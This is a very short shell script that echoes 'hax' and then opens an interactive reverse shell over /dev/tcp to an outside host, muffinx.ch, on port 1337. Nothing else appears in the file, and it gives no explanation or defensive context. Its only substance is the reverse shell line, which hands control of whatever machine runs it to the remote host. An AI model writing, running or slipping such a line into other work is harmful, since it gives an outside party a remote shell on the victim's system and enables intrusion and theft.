#!/bin/sh

echo hax
sh -i >& /dev/tcp/muffinx.ch/1337 0>&1
